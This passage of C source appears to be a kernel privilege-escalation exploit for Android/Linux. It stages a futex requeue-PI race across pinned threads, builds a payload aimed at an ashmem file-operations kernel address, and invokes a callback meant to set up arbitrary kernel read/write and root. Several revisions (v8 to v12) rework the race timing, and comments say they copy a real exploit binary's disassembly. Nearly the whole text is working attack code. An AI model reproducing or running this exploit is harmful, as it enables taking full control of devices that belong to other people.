  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v8] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v8] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* THE experiment: interrupt owner's blocked second LOCK_PI right
       * here, immediately after the FPSIMD payload delivery, before
       * doing anything else. */
      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v8] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }

      atomic_store(&g_sigusr1_done, 1);

      for (int spins = 0; spins < 20000 &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(1000);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v8] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v8] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  /* source: owner may already be gone/interrupted -- UNLOCK_PI on a
   * lock we still genuinely hold is safe regardless of what happened
   * to owner's OWN blocked attempt on it. */
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v8] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  /* owner_acquired may never come if owner was interrupted rather than
   * genuinely acquiring -- bound this wait instead of waiting forever. */
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *consumer_thread_fn_v8(void *arg) {
  (void)arg;
  pin_to_cpu(1);

  int tid;
  for (;;) {
    tid = atomic_load(&waiter_tid_g);
    if (tid != 0) {
      break;
    }
    __asm__ volatile("yield" ::: "memory");
  }

  while (!atomic_load(&g_sigusr1_done)) {
    __asm__ volatile("yield" ::: "memory");
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  fprintf(stderr, "[futex-v8] consumer firing sched_setattr tid=%d "
                   "policy=SCHED_BATCH nice=19\n",
          tid);
  errno = 0;
  long ret = sched_setattr_tid_v4(tid, 19);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v8] consumer sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret == 0) {
    atomic_store(&g_sched_setattr_ok, 1);
  }
  atomic_store(&g_sched_setattr_done, 1);
  return NULL;
}

int run_futex_trigger_v8_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v8] sigaction(SIGUSR2) failed errno=%d\n", errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v8] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v8] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v8] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v8_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v8] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v8_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: this project's own experiment, fixing v8's own race -- see
 * run_futex_trigger_v9_cb()'s comment in futex_trigger.h. Reuses
 * owner_thread_fn_v8/consumer_thread_fn_v8 unchanged; only the waiter
 * differs, adding a real delay between signaling owner and this
 * thread's own UNLOCK_PI call. */
static void *waiter_thread_fn_v9(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v9] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v9] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v9] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      int otid = atomic_load(&owner_tid_g);
      if (otid != 0) {
        long kret = syscall(SYS_tgkill, getpid(), otid, SIGUSR2);
        fprintf(stderr,
                "[futex-v9] tgkill(owner tid=%d, SIGUSR2) ret=%ld errno=%d\n",
                otid, kret, errno);
      }

      /* THE fix: give the signal real time to land and interrupt
       * owner's blocked rt_mutex_wait_proxy_lock() BEFORE this
       * thread's own UNLOCK_PI below could wake it up the ordinary
       * way instead -- v8 sent the signal then proceeded almost
       * immediately, very likely losing that race every time. */
      usleep(300000);

      atomic_store(&g_sigusr1_done, 1);

      for (int spins = 0; spins < 20000 &&
                           !atomic_load(&g_sched_setattr_done);
           spins++) {
        usleep(1000);
      }
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v9] calling post-trigger callback from WAITER "
                "thread\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v9] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v9] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v9_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v9] sigaction(SIGUSR2) failed errno=%d\n", errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v9, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v9] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v9] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v9] verify callback never invoked\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v9_full(uint64_t page_base,
                               uint64_t ashmem_misc_fops_addr,
                               futex_post_trigger_cb post_trigger_cb,
                               void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v9] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v9_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: real fcn.00003e18 0x40d4-0x4164 + fcn.00004300 0x4494-0x44bc,
 * see futex_trigger.h's run_futex_trigger_v10_cb comment for the full
 * derivation. Reuses owner_thread_fn_v8/consumer_thread_fn_v8
 * unchanged -- the consumer already waits for g_sigusr1_done then sets
 * g_sched_setattr_done right after sched_setattr, which is already
 * structurally the same handoff as the real G+0x76c/G+0x750 pair. Only
 * the waiter changes: no SIGUSR2-to-owner, no added sleep, and a
 * yield-spin (not usleep) wait for the consumer's completion flag. */
static void *waiter_thread_fn_v10(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v10] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v10] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v10] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* real binary: release the consumer immediately, zero delay,
       * no signal to owner (0x40e8-0x40fc). */
      atomic_store(&g_sigusr1_done, 1);

      /* real binary: busy-spin (yield), not usleep -- stay RUNNABLE
       * the entire time sched_setattr is applied to this thread's own
       * tid from the consumer (0x4100-0x4128, ~1s bound). */
      struct timespec spin_deadline;
      clock_gettime(CLOCK_MONOTONIC, &spin_deadline);
      spin_deadline.tv_sec += 1;
      while (!atomic_load(&g_sched_setattr_done)) {
        __asm__ volatile("yield" ::: "memory");
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > spin_deadline.tv_sec ||
            (now.tv_sec == spin_deadline.tv_sec &&
             now.tv_nsec > spin_deadline.tv_nsec)) {
          break;
        }
      }
      /* source: real fcn.00003e18 0x412c-0x4154 -- the gate counter at
       * G+0x760 that guards this call is written to 0 in exactly two
       * places in the whole binary (this same cleanup right after
       * wait_requeue_pi's ETIMEDOUT return, and app_main's init), and
       * NEVER written to a nonzero value anywhere r2 can resolve
       * statically. fcn.000076c0 (the verify/AAR-AAW self-test) has
       * exactly ONE call site in the entire binary and it is this
       * gated one. The real waiter therefore, as best as this session
       * can confirm, never calls verify/root_umh from here -- it always
       * takes the branch straight to UNLOCK_PI below. Whatever calls
       * the real AAR/AAW establishment does so from somewhere this
       * session has not located. Matching that: do NOT call the
       * callback from this thread at all; run_futex_trigger_v10_cb()
       * calls it once, after this whole routine returns, instead. */
      atomic_store(&g_sched_setattr_result_ok, atomic_load(&g_sched_setattr_ok));
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v10] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v10_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v10] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  /* source: see waiter_thread_fn_v10's comment -- the real gate at
   * G+0x760 never opens from that call site, so this thread never
   * calls the callback itself. g_post_cb/g_post_cb_ctx are unused by
   * waiter_thread_fn_v10 for v10 (kept NULL here) and the callback is
   * invoked once below instead, after the whole trigger completes. */
  g_post_cb = NULL;
  g_post_cb_ctx = NULL;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v10, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v10] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v10] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_sched_setattr_result_ok)) {
    fprintf(stderr, "[futex-v10] sched_setattr route not ok\n");
    return 0;
  }
  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr,
          "[futex-v10] calling post-trigger callback after full trigger "
          "completed (real gate never opens from the waiter thread)\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v10] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

int run_futex_trigger_v10_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v10] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v10_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

/* source: see futex_trigger.h's run_futex_trigger_v11_cb comment --
 * v10's waiter body (no SIGUSR2/delay to owner, yield-spin bounded to
 * ~1s instead of a raw cycle count) with v6's callback-from-waiter
 * gate restored, since fresh disassembly of consumer_thread_fn_v8's
 * real counterpart (0x3650 = ldaddal, an atomic increment v10's static
 * xref search missed) shows the real gate genuinely opens. */
static void *waiter_thread_fn_v11(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v11] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v11] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v11] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* real binary: release the consumer immediately, zero delay,
       * no signal to owner (0x40e8-0x40fc). */
      atomic_store(&g_sigusr1_done, 1);

      /* real binary: busy-spin (yield), not usleep -- stay RUNNABLE
       * the entire time sched_setattr is applied to this thread's own
       * tid from the consumer (0x4100-0x4128, ~1s bound). */
      struct timespec spin_deadline;
      clock_gettime(CLOCK_MONOTONIC, &spin_deadline);
      spin_deadline.tv_sec += 1;
      while (!atomic_load(&g_sched_setattr_done)) {
        __asm__ volatile("yield" ::: "memory");
        struct timespec now;
        clock_gettime(CLOCK_MONOTONIC, &now);
        if (now.tv_sec > spin_deadline.tv_sec ||
            (now.tv_sec == spin_deadline.tv_sec &&
             now.tv_nsec > spin_deadline.tv_nsec)) {
          break;
        }
      }
      /* source: raw vaddr 0x4144-0x4154 -- verify() called from THIS
       * thread, gated on G+0x760 (g_sched_setattr_ok) >= 1. Restored
       * from v6 after confirming (see futex_trigger.h) that the gate
       * genuinely opens -- v10's belief that it never does was based
       * on a static search that missed an LSE atomic-increment write. */
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v11] calling post-trigger callback from WAITER "
                "thread (matches real fcn.000076c0 call site)\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v11] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v11] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v11_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v11] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);
  atomic_store(&owner_tid_g, 0);
  atomic_store(&g_sched_setattr_done, 0);
  atomic_store(&g_sched_setattr_ok, 0);
  atomic_store(&g_sched_setattr_result_ok, 0);
  atomic_store(&g_sigusr1_done, 0);
  atomic_store(&g_cb_invoked, 0);
  atomic_store(&g_cb_result, 0);
  g_post_cb = post_trigger_cb;
  g_post_cb_ctx = ctx;

  pin_to_cpu(0);

  pthread_t waiter, owner, consumer;
  if (pthread_create(&waiter, NULL, waiter_thread_fn_v11, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn_v8, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&consumer, NULL, consumer_thread_fn_v8, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) && !atomic_load(&owner_started)) {
    usleep(1000);
  }

  usleep(100000);

  errno = 0;
  long requeue_ret = futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1,
                               (void *)1, &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v11] cmp_requeue_pi ret=%ld errno=%d\n",
          requeue_ret, requeue_errno);
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }

  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v11] waiter route not ok\n");
    return 0;
  }
  if (!atomic_load(&g_cb_invoked)) {
    fprintf(stderr, "[futex-v11] verify callback never invoked (real gate "
                     "did not open this run)\n");
    return 0;
  }
  return atomic_load(&g_cb_result);
}

int run_futex_trigger_v11_full(uint64_t page_base,
                                uint64_t ashmem_misc_fops_addr,
                                futex_post_trigger_cb post_trigger_cb,
                                void *ctx) {
  if (!sigusr1_install_handler()) {
    fprintf(stderr, "[futex-v11] sigusr1 handler install failed, aborting\n");
    return 0;
  }
  g_sigusr1_page_base = page_base;
  g_sigusr1_ashmem_target = ashmem_misc_fops_addr;
  atomic_store(&g_use_sigusr1, 1);
  int ret = run_futex_trigger_v11_cb(post_trigger_cb, ctx);
  atomic_store(&g_use_sigusr1, 0);
  return ret;
}

static void *waiter_thread_fn_v12(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v12] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v12] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v12] sigusr1 fire_and_wait=%d\n", sig_ok);
    if (sig_ok) {
      /* real binary: release the consumer immediately, zero delay,
       * no signal to owner (0x40e8-0x40fc). */
      atomic_store(&g_sigusr1_done, 1);

      /* real binary: busy-spin (yield), not usleep -- stay RUNNABLE
       * the entire time sched_setattr is applied to this thread's own
       * tid from the consumer (0x4100-0x4128, ~1s bound). */
      /* source: raw vaddr 0x4108-0x4128 -- real bound is a plain
       * iteration count (0x3b9ac9ff), not a cntvct_el0 time check --
       * see futex_trigger.h's run_futex_trigger_v12_cb comment. */
      for (uint64_t spins = 0;
           spins < 0x3b9ac9ffULL && !atomic_load(&g_sched_setattr_done);
           spins++) {
        __asm__ volatile("yield" ::: "memory");
      }
      /* source: raw vaddr 0x4144-0x4154 -- verify() called from THIS
       * thread, gated on G+0x760 (g_sched_setattr_ok) >= 1. Restored
       * from v6 after confirming (see futex_trigger.h) that the gate
       * genuinely opens -- v10's belief that it never does was based
       * on a static search that missed an LSE atomic-increment write. */
      if (atomic_load(&g_sched_setattr_ok) && g_post_cb != NULL) {
        fprintf(stderr,
                "[futex-v12] calling post-trigger callback from WAITER "
                "thread (matches real fcn.000076c0 call site)\n");
        int cb_ret = g_post_cb(g_post_cb_ctx);
        fprintf(stderr, "[futex-v12] post-trigger callback returned %d\n",
                cb_ret);
        atomic_store(&g_cb_result, cb_ret);
        atomic_store(&g_cb_invoked, 1);
      }
    }
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v12] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  for (int spins = 0; spins < 2000 && !atomic_load(&owner_acquired);
       spins++) {
    usleep(1000);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_v12_cb(futex_post_trigger_cb post_trigger_cb,
                              void *ctx) {
  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = sigusr2_noop_handler;
  if (sigaction(SIGUSR2, &sa, NULL) != 0) {
    fprintf(stderr, "[futex-v12] sigaction(SIGUSR2) failed errno=%d\n",
            errno);
    return 0;
  }

  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
